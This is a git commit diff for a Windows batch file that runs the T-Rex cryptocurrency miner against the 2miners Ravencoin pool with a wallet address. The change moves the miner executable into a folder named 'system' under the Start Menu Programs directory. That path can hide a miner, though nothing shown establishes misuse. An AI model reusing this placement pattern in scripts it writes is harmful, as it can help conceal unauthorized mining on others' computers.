e278ab94f4d68f2f4e62d8c5abe693c8b0f6ef01
Carel3DS <52781415+Carel3DS@users.noreply.github.com>
2021-03-27 15:56:27 +0100

    Update RVN-2miners.bat

--- RVN-2miners.bat
+++ RVN-2miners.bat
@@ -1,2 +1,2 @@
-t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RLrNPzaRqn5fbBXAevTkH6PKFdscjeAjy9.pcASUS -p x
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\system\t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RLrNPzaRqn5fbBXAevTkH6PKFdscjeAjy9.pcASUS -p x
 pause
